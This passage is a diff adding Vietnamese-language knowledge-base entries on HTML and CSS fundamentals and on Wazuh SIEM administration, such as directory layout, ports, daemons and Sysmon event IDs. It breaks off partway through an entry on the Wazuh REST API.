+      "id": "9bb60aa4-c420-4252-b9c8-1736f07db54e",
+      "type": "command",
+      "title": "Padding (Đệm trong)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Không gian nằm giữa Content (nội dung) và Border (đường viền). Trình duyệt tính padding vào kích thước tổng của phần tử nếu không dùng box-sizing. Cú pháp shorthand nhận từ 1 đến 4 giá trị theo chiều kim đồng hồ (Trên - Phải - Dưới - Trái).",
+      "code": ".box {\n  padding-top: 10px;\n  padding-right: 20px;\n  /* Shorthand: Top Right Bottom Left */\n  padding: 10px 20px 15px 5px;\n  /* Shorthand: Vertical Horizontal */\n  padding: 10px 20px;\n}",
+      "notes": "Padding không nhận giá trị âm. Nền (background) của phần tử sẽ trải dài bao phủ luôn cả khu vực padding.",
+      "tags": [
+        "css",
+        "box-model",
+        "padding"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281935443
+    },
+    {
+      "id": "f7624ace-4382-426a-9f80-99a8382b21bf",
+      "type": "command",
+      "title": "CSS Selectors (Bộ chọn cơ bản)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Cú pháp để trình duyệt dò tìm element trên DOM Tree. Gồm: Bộ chọn thẻ (Element - vd: p), Bộ chọn ID (ID - vd: #main), Bộ chọn Lớp (Class - vd: .box), Bộ chọn tất cả (*). Có thể kết hợp: '.box p' (chọn thẻ p nằm trong class box).",
+      "code": "/* Cú pháp: Selector { Property: Value; } */\n* { margin: 0; padding: 0; } /* Reset CSS toàn cục */\n#header .nav-item { font-weight: bold; }",
+      "notes": "Tối ưu hóa performance: Trình duyệt đọc selector từ phải qua trái. Không nên viết selector quá dài và sâu (quá 3 cấp).",
+      "tags": [
+        "css",
+        "selector"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281924389
+    },
+    {
+      "id": "852dbabb-1976-4ee2-88f2-1360e4b69c52",
+      "type": "command",
+      "title": "Thẻ liên kết và đa phương tiện (Links & Media)",
+      "categoryId": "html",
+      "language": "Linux",
+      "content": "<a> (Anchor) tạo siêu liên kết, dựa vào thuộc tính 'href' để định tuyến. <img> dùng để nhúng ảnh, là thẻ self-closing (không có thẻ đóng), lấy dữ liệu từ thuộc tính 'src'.",
+      "code": "<a href=\"https://google.com\" target=\"_blank\">Đến Google</a>\n<img src=\"/path/to/image.jpg\" alt=\"Văn bản thay thế khi lỗi ảnh\">",
+      "notes": "Thuộc tính 'target=\"_blank\"' mở link ở tab mới. Thuộc tính 'alt' trên thẻ img là bắt buộc để đảm bảo Accessibility và SEO.",
+      "tags": [
+        "html",
+        "anchor",
+        "image"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784279320753
+    },
+    {
+      "id": "6d91f0e5-a9d3-4b05-8e65-06c1060d6a65",
+      "type": "command",
+      "title": "Thẻ danh sách (Lists)",
+      "categoryId": "html",
+      "language": "Linux",
+      "content": "<ul> tạo danh sách không thứ tự (Unordered List - dùng bullet), <ol> tạo danh sách có thứ tự (Ordered List - đánh số). <li> (List Item) định nghĩa từng phần tử con bên trong. Bản chất trình duyệt gán thuộc tính 'display: list-item' cho thẻ li.",
+      "code": "<ul class=\"menu\">\n  <li>Trang chủ</li>\n  <li>Sản phẩm</li>\n</ul>",
+      "notes": "Rất hay được dùng để dựng thanh điều hướng (Navigation Bar) bằng cách reset margin/padding và set display lại thành inline-block hoặc flex.",
+      "tags": [
+        "html",
+        "list",
+        "ul",
+        "ol",
+        "li"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784279349912
+    },
+    {
+      "id": "6f088903-df54-41a2-b792-4ebd81ee4596",
+      "type": "command",
+      "title": "Các thẻ HTML nhóm và phân chia (Containers)",
+      "categoryId": "html",
+      "language": "Linux",
+      "content": "<div> là thẻ block-level vô nghĩa (non-semantic), dùng làm container gom nhóm các phần tử để tạo layout. <span> là thẻ inline-level vô nghĩa, dùng để bọc một đoạn text ngắn nhắm mục đích style bằng CSS mà không phá vỡ luồng văn bản.",
+      "code": "<div class=\"wrapper\">\n  <span class=\"highlight\">Cảnh báo:</span> Lỗi hệ thống!\n</div>",
+      "notes": "Chỉ dùng div/span khi không có thẻ semantic nào (header, footer, article, section) phù hợp hơn.",
+      "tags": [
+        "html",
+        "container",
+        "div",
+        "span"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784279364485
+    },
+    {
+      "id": "882de192-b5e5-4e4b-bd84-2f45a6a6a090",
+      "type": "command",
+      "title": "Các thẻ HTML văn bản (Text Formatting)",
+      "categoryId": "html",
+      "language": "Linux",
+      "content": "Nhóm thẻ tạo cấu trúc nội dung. <h1> đến <h6> đánh dấu tiêu đề (Heading), tạo cây thư mục ngữ nghĩa cho trang. <p> định nghĩa đoạn văn (Paragraph). <strong> và <em> nhấn mạnh văn bản (semantic), khác với <b> và <i> chỉ thuần về mặt hiển thị.",
+      "code": "<h1>Tiêu đề cấp 1 (Chỉ nên có 1 tag/trang)</h1>\n<p>Đoạn văn chứa <strong>chữ in đậm (quan trọng)</strong></p>",
+      "notes": "Trình duyệt tạo Box-model dạng 'block' cho thẻ H và P (chiếm toàn bộ chiều ngang), trong khi thẻ strong/em là 'inline'.",
+      "tags": [
+        "html",
+        "typography",
+        "block",
+        "inline"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784279385263
+    },
+    {
+      "id": "8aaf2363-e338-4811-830a-054815cbdda0",
+      "type": "command",
+      "title": "Pseudo-classes & Pseudo-elements",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Pseudo-classes (Lớp giả - 1 dấu :) dùng để bắt trạng thái của phần tử (như :hover, :active, :focus, :nth-child). Pseudo-elements (Phần tử giả - 2 dấu ::) dùng để can thiệp vào các phần cụ thể của element hoặc chèn thêm DOM giả (như ::before, ::after, ::first-letter).",
+      "code": "a:hover { color: blue; }\n\n.title::after {\n  content: \"\";\n  display: block;\n  width: 100%;\n  height: 2px;\n  background: red;\n}",
+      "notes": "Khi dùng ::before và ::after, bắt buộc phải khai báo thuộc tính 'content' (dù là rỗng \"\"), nếu không DOM giả này sẽ không được render ra bộ nhớ trình duyệt.",
+      "tags": [
+        "pseudo-classes",
+        "pseudo-elements"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784281916165
+    },
+    {
+      "id": "e85dcd8a-b55f-4f6e-b358-6fcae6625fec",
+      "type": "command",
+      "title": "CSS Position (Định vị)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Kiểm soát tọa độ render của phần tử. Static (mặc định theo luồng), Relative (dịch chuyển so với vị trí ban đầu của chính nó), Absolute (rút khỏi luồng DOM, neo theo gốc tọa độ của phần tử cha gần nhất có set position khác static), Fixed (neo theo viewport màn hình), Sticky (lai giữa relative và fixed khi cuộn).",
+      "code": ".parent { position: relative; }\n.child { \n  position: absolute; \n  top: 50%; \n  left: 50%; \n  transform: translate(-50%, -50%); \n}",
+      "notes": "Kỹ thuật set cha 'relative', con 'absolute' là phương pháp kinh điển để căn giữa hoàn toàn một phần tử hoặc đặt các element chồng lên nhau theo trục Z (z-index).",
+      "tags": [
+        "position",
+        "relative",
+        "absolute",
+        "layout"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784281903679
+    },
+    {
+      "id": "1975f9a0-3766-4fff-b5f9-f1d77d25c7bb",
+      "type": "command",
+      "title": "CSS Background Properties",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Các thuộc tính kiểm soát nền. Bao gồm: background-color, background-image (load ảnh nền), background-size (cover: phủ kín, contain: hiển thị trọn vẹn), background-position (tọa độ gốc của ảnh) và background-origin (tính từ border-box, padding-box hay content-box).",
+      "code": ".hero {\n  background: #000 url('bg.jpg') no-repeat center center / cover;\n}",
+      "notes": "Cú pháp shorthand giúp gộp nhiều lệnh thành 1 dòng. Thứ tự khuyên dùng: color -> image -> repeat -> position / size.",
+      "tags": [
+        "background",
+        "shorthand"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784281916165
+    },
+    {
+      "id": "f7f1910a-a8ad-44bb-929a-1fca3fd93e34",
+      "type": "command",
+      "title": "CSS Box Model",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Mô hình hộp cơ bản của mọi phần tử web. Cấu tạo từ trong ra ngoài: Content (nội dung) -> Padding (đệm trong) -> Border (viền) -> Margin (lề ngoài). Mặc định, width/height chỉ tính cho Content.",
+      "code": ".box {\n  width: 200px;\n  padding: 20px;\n  border: 2px solid black;\n  box-sizing: border-box;\n}",
+      "notes": "Thuộc tính 'box-sizing: border-box' là bắt buộc trong mọi dự án hiện đại. Nó ép trình duyệt tính tổng chiều rộng/cao bao gồm cả content, padding và border, ngăn chặn việc layout bị vỡ khi tăng padding.",
+      "tags": [
+        "box-model",
+        "padding",
+        "margin",
+        "border"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784281903679
+    },
+    {
+      "id": "bf72311c-ec74-4aca-a9db-83e560aa6af8",
+      "type": "command",
+      "title": "CSS Units & Variables",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Đơn vị đo lường được chia làm 2 loại: Tuyệt đối (px - phụ thuộc độ phân giải màn hình) và Tương đối (%, em, rem, vh, vw). Đơn vị 'rem' được tính dựa trên font-size của root (thẻ <html>), là best practice để thiết kế Responsive. Biến CSS giúp lưu trữ giá trị để tái sử dụng.",
+      "code": ":root {\n  --primary-color: #3498db;\n}\n\n.text {\n  color: var(--primary-color);\n  font-size: 1.5rem; /* = 24px nếu root font-size là 16px */\n}",
+      "notes": "Biến CSS (Custom Properties) có khả năng tính toán lại ở runtime và tuân thủ tính kế thừa của cây DOM, khác với biến của SASS/LESS (chỉ biên dịch lúc build).",
+      "tags": [
+        "units",
+        "rem",
+        "css-variables"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784281903679
+    },
+    {
+      "id": "5404eb7c-26c3-4292-a143-7243b549c0d7",
+      "type": "knowledge",
+      "title": "Độ ưu tiên trong CSS (Specificity)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Cơ chế giải quyết xung đột khi nhiều ruleset cùng tác động vào một phần tử. Trọng số được tính toán theo quy tắc: !important (Vô đối) > Inline style (1000) > ID (100) > Class/Pseudo-class/Attribute (10) > Element/Pseudo-element (1).",
+      "code": "#nav .link.active { color: red; } /* Trọng số: 100 + 10 + 10 = 120 */",
+      "notes": "Hạn chế tối đa việc sử dụng !important vì nó phá vỡ luồng kế thừa tự nhiên của CSS, gây khó khăn cực lớn cho việc maintain code sau này.",
+      "tags": [
+        "specificity",
+        "css-architecture"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784278735284
+    },
+    {
+      "id": "eab3772a-3d22-450f-8eb4-8785fee39da2",
+      "type": "command",
+      "title": "Cách nhúng CSS & CSS Selectors",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "CSS có 3 cách nhúng: Inline (trong thẻ), Internal (thẻ <style> trong head), và External (file .css riêng rẽ). Trình duyệt áp dụng CSS thông qua Selector. Các selector cơ bản: Element selector (chọn thẻ), Class selector (bắt đầu bằng dấu chấm .), ID selector (bắt đầu bằng dấu thăng #).",
+      "code": "/* Bắt thẻ p */\np { color: red; }\n\n/* Bắt class .box */\n.box { width: 100px; }\n\n/* Bắt id #header */\n#header { background: black; }",
+      "notes": "Trình duyệt phân tích cú pháp CSS Selectors từ phải sang trái (Right-to-Left) để tối ưu hóa hiệu suất match cây DOM.",
+      "tags": [
+        "css-integration",
+        "selectors"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784278735284
+    },
+    {
+      "id": "4143034c-799d-4307-9143-45e488646523",
+      "type": "command",
+      "title": "HTML Attributes (Thuộc tính)",
+      "categoryId": "html",
+      "language": "HTML",
+      "content": "Cung cấp thêm thông tin cấu hình cho các phần tử HTML. Định nghĩa ở thẻ mở dưới dạng key=\"value\". Các attribute quan trọng nhất là 'id' (định danh duy nhất cho 1 phần tử) và 'class' (phân loại nhóm phần tử để tái sử dụng CSS/JS).",
+      "code": "<img src=\"image.jpg\" alt=\"Mô tả ảnh\" class=\"thumbnail\" id=\"main-img\">",
+      "notes": "Attribute 'id' mang tính duy nhất trong toàn bộ tài liệu, giúp định tuyến (anchor link) hoặc thao tác chính xác qua DOM API trong JS.",
+      "tags": [
+        "attributes",
+        "id",
+        "class"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784278735284
+    },
+    {
+      "id": "d512e1fe-bc0d-4e0c-8ab8-6cc75198b5fe",
+      "type": "command",
+      "title": "Các thẻ HTML thông dụng",
+      "categoryId": "html",
+      "language": "HTML",
+      "content": "Các thẻ HTML được chia làm 2 đặc tính hiển thị chính: Block-level (chiếm toàn bộ chiều ngang, ví dụ: h1-h6, p, div, ul, li) và Inline-level (chỉ chiếm không gian nội dung của nó, ví dụ: a, span, img, strong).",
+      "code": "<h1>Heading 1</h1>\n<p>Đoạn văn bản</p>\n<a href=\"https://example.com\">Liên kết</a>",
+      "notes": "Nên sử dụng thẻ Semantic (có ý nghĩa như header, footer, article, nav) để tốt cho SEO và các công cụ đọc màn hình (Screen readers) thay vì chỉ lạm dụng thẻ div.",
+      "tags": [
+        "tags",
+        "block",
+        "inline",
+        "semantic"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784278735284
+    },
+    {
+      "id": "68722b12-b1d7-421a-8065-9fdd43dc4ef9",
+      "type": "knowledge",
+      "title": "Cấu trúc cơ bản của file HTML",
+      "categoryId": "html",
+      "language": "HTML",
+      "content": "Bản chất HTML là ngôn ngữ đánh dấu, dùng để xây dựng cây DOM (Document Object Model). Một file chuẩn luôn bắt đầu bằng <!DOCTYPE html> để báo cho trình duyệt biết đang dùng HTML5. Thẻ <html> là root, chứa <head> (metadata, không hiển thị) và <body> (nội dung render ra màn hình).",
+      "code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n    <!-- Nội dung -->\n</body>\n</html>",
+      "notes": "Trình duyệt đọc file từ trên xuống dưới. Các script tải ở <head> có thể chặn quá trình render <body> nếu không dùng thuộc tính defer/async.",
+      "tags": [
+        "structure",
+        "dom",
+        "html5"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1784278735284,
+      "updatedAt": 1784278735284
+    },
+    {
+      "id": "6cfe8776-edba-462f-b9a1-6ff32f1c8316",
+      "type": "knowledge",
+      "title": "Bản đồ giải phẫu toàn diện thư mục lõi Wazuh Manager (/var/ossec)",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Toàn bộ 'trái tim' của hệ thống Wazuh Manager được đặt tại thư mục gốc /var/ossec/ [1]. Dưới đây là chi tiết chức năng của từng thư mục và tệp tin quan trọng nhất:\n\n1. etc/ (Cấu hình trung tâm - ĐƯỢC SỬA): Chứa `ossec.conf` (quyết định toàn bộ luồng log và module) [2], `client.keys` (danh sách key xác thực của mọi Agent) [3, 4]. Thư mục con `rules/local_rules.xml` và `decoders/local_decoder.xml` là nơi chuyên biệt để viết Custom Rule và Decoder [5]. Thư mục `lists/` chứa các từ điển CDB phục vụ Threat Intel [3].\n\n2. bin/ (Công cụ thực thi - KHÔNG SỬA): Chứa các tiến trình não bộ (daemons) như `wazuh-analysisd`, `wazuh-remoted`, `wazuh-db` và các công cụ CLI như `wazuh-logtest` (để test rule), `agent_control` [6, 7].\n\n3. logs/ (Lưu trữ dấu vết): Chứa `ossec.log` (ghi nhận trạng thái/lỗi của dịch vụ Manager) [8]. Thư mục `alerts/` chứa `alerts.json` (cảnh báo đã khớp rule, được Filebeat đọc để ném lên Indexer) [8, 9]. Thư mục `archives/` chứa toàn bộ log thô nguyên thủy từ agent gửi về (nếu bật logall) [9, 10].\n\n4. ruleset/ (Tri thức mặc định - KHÔNG SỬA): Chứa hàng ngàn tệp Rule, Decoder và chuẩn SCA mặc định do Wazuh viết sẵn [5, 11]. Tuyệt đối không sửa trực tiếp ở đây vì sẽ bị ghi đè mất sạch khi update phiên bản [5, 12].\n\n5. var/db/ (Cơ sở dữ liệu SQLite): Nơi lưu trữ trạng thái nội bộ. File `global.db` chứa thông tin toàn bộ Agent. Thư mục `agents/` chứa các tệp .db độc lập cho từng Agent (lưu lịch sử FIM, lỗ hổng CVE) [13, 14].\n\n6. queue/ (Giao tiếp nội bộ IPC): Nơi chứa các socket mạng UNIX (vd: `queue/sockets/`) để các tiến trình như remoted truyền log thô sang analysisd [15, 16]. Nếu bị nghẽn (bottleneck), log sẽ rớt tại đây [15].\n\n7. active-response/bin/: Chứa các file script thực thi phản ứng tự động (Bash/Python) như `firewall-drop` hoặc script tùy chỉnh [17, 18]. Mọi script ở đây phải được cấp quyền chmod 750 [17].\n\n8. api/ : Chứa tệp cấu hình `configuration/api.yaml` quy định cổng 55000, chứng chỉ SSL và phân quyền cho REST API (kết nối với Dashboard) [19].\n\n9. integrations/: Chứa các script Python để tích hợp và đẩy/kéo dữ liệu từ dịch vụ ngoại vi (như `virustotal.py`, Telegram, MISP) [13, 19].\n\n10. framework/ & wodles/: `framework/` chứa bộ mã nguồn thư viện Python điều phối API [20]. `wodles/` chứa các module đặc thù thu thập log đám mây (AWS, Azure, Docker) [20, 21].",
+      "code": "/var/ossec/\n├── active-response/bin/ (Chứa script phản kháng: firewall-drop...)\n├── api/                 (Cấu hình REST API port 55000)\n├── bin/                 (Các tiến trình lõi & CLI tools)\n├── etc/                 (Cấu hình tùy chỉnh: ossec.conf, rules, decoders)\n├── framework/           (Thư viện mã nguồn Python lõi của Wazuh)\n├── integrations/        (Script kết nối API ngoài: virustotal, telegram)\n├── logs/                (Nhật ký: ossec.log, alerts.json, archives.log)\n├── queue/               (Socket giao tiếp nội bộ giữa các process)\n├── ruleset/             (Luật và bộ giải mã mặc định - KHÔNG ĐƯỢC SỬA)\n├── var/db/              (Cơ sở dữ liệu SQLite: global.db)\n└── wodles/              (Module giám sát Cloud: aws, azure, docker)",
+      "notes": "Quy tắc sinh tử: Bất kỳ cấu hình nào muốn tùy chỉnh (Rule, Decoder) đều BẮT BUỘC lưu ở thư mục /etc/. Tuyệt đối không đụng vào thư mục /ruleset/ hay /bin/ [12, 22].",
+      "tags": [
+        "wazuh",
+        "architecture",
+        "directory",
+        "manager",
+        "files"
+      ],
+      "pinned": true,
+      "isKnowledge": true,
+      "createdAt": 1782456432026,
+      "updatedAt": 1782456494711
+    },
+    {
+      "id": "cbb3b89d-1d7b-4932-baf2-2a0e20e22bf1",
+      "type": "knowledge",
+      "title": "Log bị đầy ổ cứng quá nhanh (Do bật tính năng Logall)",
+      "categoryId": "wazuh",
+      "language": "XML",
+      "content": "Hệ thống ghi nhận file `/var/ossec/logs/archives/archives.log` (và archives.json) phình to khủng khiếp. Nguyên nhân do trong `ossec.conf` đang set `<logall>yes</logall>`, khiến Wazuh lưu 100% log thô dù không khớp Rule nào. Cách xử lý: Chỉ bật thẻ này khi cần Debug/Lấy raw log, xong việc phải set về `<logall>no</logall>` để tiết kiệm ổ cứng.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "error",
+        "troubleshooting",
+        "wazuh",
+        "storage",
+        "archives"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1784282076371
+    },
+    {
+      "id": "773f6eac-7b21-40f7-be3f-19db2e9ca9c5",
+      "type": "knowledge",
+      "title": "Các trường (Fields) dữ liệu Sysmon thông dụng trên SIEM",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Sau khi Wazuh Manager dùng decoder-json.xml bóc tách log Sysmon, nó sẽ sinh ra các field để truy vấn trên Dashboard: \n`win.system.eventID`, `win.eventdata.image` (Đường dẫn tiến trình), `win.eventdata.commandLine` (Lệnh thực thi), `win.eventdata.destinationIp` (IP C2), `win.eventdata.hashes` (Mã băm MD5/SHA256).",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "sysmon",
+        "fields",
+        "decoder",
+        "kql"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1784282061351
+    },
+    {
+      "id": "1f5d9580-a478-4e9e-8352-606aa1a07585",
+      "type": "knowledge",
+      "title": "Các Event ID của Sysmon bắt buộc SOC phải thuộc",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "• ID 1 (Process Creation): Truy vết LOLBins, Malware thực thi.\n• ID 3 (Network Connection): Phát hiện mã độc gọi về C2 Server.\n• ID 8 (CreateRemoteThread): Hành vi Process Injection.\n• ID 11 (FileCreate): Ransomware thả file, File Dropper.\n• ID 13 (Registry Value Set): Kẻ tấn công ghi mã độc vào thẻ Run/RunOnce để tự khởi động (Persistence).\n• ID 22 (DNS Event): Exfiltration dữ liệu hoặc gọi tên miền C2.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "sysmon",
+        "event-id",
+        "threat-hunting",
+        "windows"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1784282061351
+    },
+    {
+      "id": "c8b127e2-92c4-4689-beef-5d7cea16b3a4",
+      "type": "knowledge",
+      "title": "Danh sách các Port (Cổng mạng) vận hành SIEM",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "• Port 1514 (TCP/UDP): Giao tiếp log Agent -> Manager (wazuh-remoted).\n• Port 514 (UDP): Nhận log Agentless Syslog (Router/Firewall) -> Manager.\n• Port 1515 (TCP): Đăng ký Key Agent mới (wazuh-authd).\n• Port 9200 (HTTPS): Filebeat lấy alerts.json đẩy sang OpenSearch Indexer.\n• Port 55000 (HTTPS): Giao tiếp REST API từ Dashboard -> Manager.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "network",
+        "ports",
+        "wazuh",
+        "architecture"
+      ],
+      "pinned": true,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782456541808
+    },
+    {
+      "id": "1bf89686-9a1b-4e35-8f4e-f68b98253f73",
+      "type": "knowledge",
+      "title": "Quy ước đánh số Rule ID cho Custom Rules",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Wazuh phân hoạch Rule ID rất nghiêm ngặt: 0-4999 (Rule lõi), 5000-9999 (OS system), 10000-49999 (App), 50000-99999 (Security/MITRE). \nKhi viết rule mới của riêng bạn (Custom Rules), BẮT BUỘC phải đặt ID từ dải 100000 trở lên để không bị xung đột.",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "wazuh",
+        "rules",
+        "rule-id",
+        "customization"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "81825696-2f01-4935-9297-fa0fee4dd0a0",
+      "type": "knowledge",
+      "title": "Vai trò của các Daemons (Tiến trình lõi) của Manager",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "1. wazuh-remoted: Lắng nghe cổng 1514 (TCP/UDP), xác thực và nhận log mã hóa từ Agent.\n2. wazuh-analysisd: 'Bộ não' nhận log từ remoted, chạy qua Pipeline: Decoder -> Rules -> Sinh Alert.\n3. wazuh-execd: Thực thi script Active Response khi Alert nổ.\n4. wazuh-syscheckd: Quản lý tính năng FIM (so sánh hash MD5/SHA256).\n5. wazuh-authd: Cổng cấp Key cho Agent mới (Port 1515).",
+      "code": "",
+      "notes": "",
+      "tags": [
+        "wazuh",
+        "architecture",
+        "daemons",
+        "process"
+      ],
+      "pinned": true,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782456498335
+    },
+    {
+      "id": "255b4316-4b75-4e5b-80ae-21021681b21d",
+      "type": "command",
+      "title": "Push cấu hình tập trung xuống Agent (shared/agent.conf)",
+      "categoryId": "wazuh",
+      "language": "XML",
+      "content": "Tính năng Centralized Configuration. Thay vì SSH vào từng máy nhánh để chỉnh ossec.conf, bạn chỉ cần sửa file agent.conf trên Manager. Nó sẽ tự động push cấu hình (như thêm thư mục FIM, đổi file log) áp dụng cho mọi Agent hoặc 1 nhóm Agent (VD: nhóm windows_group).",
+      "code": "/var/ossec/etc/shared/default/agent.conf",
+      "notes": "",
+      "tags": [
+        "file",
+        "wazuh",
+        "configuration",
+        "deployment"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "65eab071-8450-4123-9640-d94cccd77ff4",
+      "type": "command",
+      "title": "Cơ sở dữ liệu SQLite Runtime (global.db)",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Wazuh không dùng MySQL mà dùng SQLite để quản lý state nội bộ của hệ thống. File global.db chứa thông tin của tất cả Agent (Tên, IP, OS, Version). Wazuh REST API đọc file này để trả data lên Dashboard.",
+      "code": "/var/ossec/var/db/global.db\n/var/ossec/var/db/001.db (FIM database lưu hash riêng của Agent 001)",
+      "notes": "",
+      "tags": [
+        "file",
+        "wazuh",
+        "database",
+        "sqlite"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "79ed4597-1018-49e2-8a5a-2c66e2f68810",
+      "type": "command",
+      "title": "File lưu trữ danh sách xác thực khóa Agent (client.keys)",
+      "categoryId": "wazuh",
+      "language": "Khác",
+      "content": "Chứa danh sách tất cả các Agent đã được đăng ký với hệ thống. File này được quản lý ngầm bởi wazuh-authd và được wazuh-remoted dùng để xác minh tính hợp lệ khi Agent gửi log.",
+      "code": "/var/ossec/etc/client.keys",
+      "notes": "Format mỗi dòng chuẩn: `ID Tên IP Key` (Ví dụ: 001 window10 192.168.1.50 abc123def...). Có thể dùng lệnh `manage_agents` để thao tác với file này.",
+      "tags": [
+        "file",
+        "wazuh",
+        "authentication",
+        "keys"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "bc4148a2-b9f2-4aa5-a039-0002cd49ff59",
+      "type": "command",
+      "title": "File cấu hình thông số kỹ thuật nội bộ (internal_options)",
+      "categoryId": "wazuh",
+      "language": "Khác",
+      "content": "Chứa các tham số vận hành ở mức sâu của hệ thống như: buffer size, timeout, CPU priority (Ví dụ: analysisd.max_output_size, remoted.recv_counter_flush).",
+      "code": "/var/ossec/etc/internal_options.conf",
+      "notes": "Không sửa trực tiếp file này. Hãy copy các dòng cần thiết sang file `local_internal_options.conf` để tùy chỉnh nhằm giữ được config sau mỗi lần update hệ thống.",
+      "tags": [
+        "file",
+        "wazuh",
+        "config",
+        "internal"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "0e42b72e-3769-436b-a26a-ea1055c59864",
+      "type": "command",
+      "title": "Thư mục chứa kịch bản Active Response (Phản kháng tự động)",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Nơi lưu các script thực thi. Khi wazuh-analysisd sinh cảnh báo, wazuh-execd sẽ gọi các script ở đây. Các script có sẵn: firewall-drop.sh (chặn IP Linux), firewall-drop.cmd (chặn IP Windows), disable-account.sh, host-deny.sh.",
+      "code": "/var/ossec/active-response/bin/",
+      "notes": "Script tự viết (Bash/Python) như gửi Telegram hoặc Isolate Host phải đặt vào đây và cấp quyền execute (chmod 750).",
+      "tags": [
+        "directory",
+        "wazuh",
+        "active-response",
+        "scripts"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782454721906
+    },
+    {
+      "id": "86a89023-3d75-4865-9adb-0b2c82bae2a9",
+      "type": "knowledge",
+      "title": "Quy tắc vàng phân vùng hệ thống file (/var/ossec/)",
+      "categoryId": "wazuh",
+      "language": "N/A",
+      "content": "Tuyệt đối phân biệt 2 thư mục này: \n1. /var/ossec/etc/ : Thư mục chứa cấu hình tùy chỉnh (Custom Rules/Decoders). ✅ Được phép sửa. Không bị ghi đè khi update.\n2. /var/ossec/ruleset/ : Thư mục chứa Rules và Decoders mặc định (Built-in). ❌ Tuyệt đối không sửa, vì update Wazuh bằng lệnh apt sẽ xóa sạch và ghi đè lại toàn bộ thư mục này.",
+      "code": "/var/ossec/etc/rules/sysmon_rules.xml (Nơi viết code)\n/var/ossec/ruleset/rules/0595-win-sysmon_rules.xml (Chỉ để tham khảo)",
+      "notes": "",
+      "tags": [
+        "directory",
+        "wazuh",
+        "rules",
+        "best-practices"
+      ],
+      "pinned": true,
+      "isKnowledge": true,
+      "createdAt": 1782454721906,
+      "updatedAt": 1782456510024
+    },
+    {
+      "id": "020a0d31-f12c-4472-bf01-44f5bd6a87e4",
+      "type": "command",
+      "title": "Giao tiếp Wazuh bằng REST API (Port 55000)",
+      "categoryId": "wazuh",
+      "language": "Bash (cURL)",
+      "content": "Wazuh API cung cấp các endpoint để lấy danh sách Agent, rules, decoders và điều khiển hệ thống từ xa thông qua framework Python nội bộ. Mọi kết quả được trả về dưới dạng JSON.",
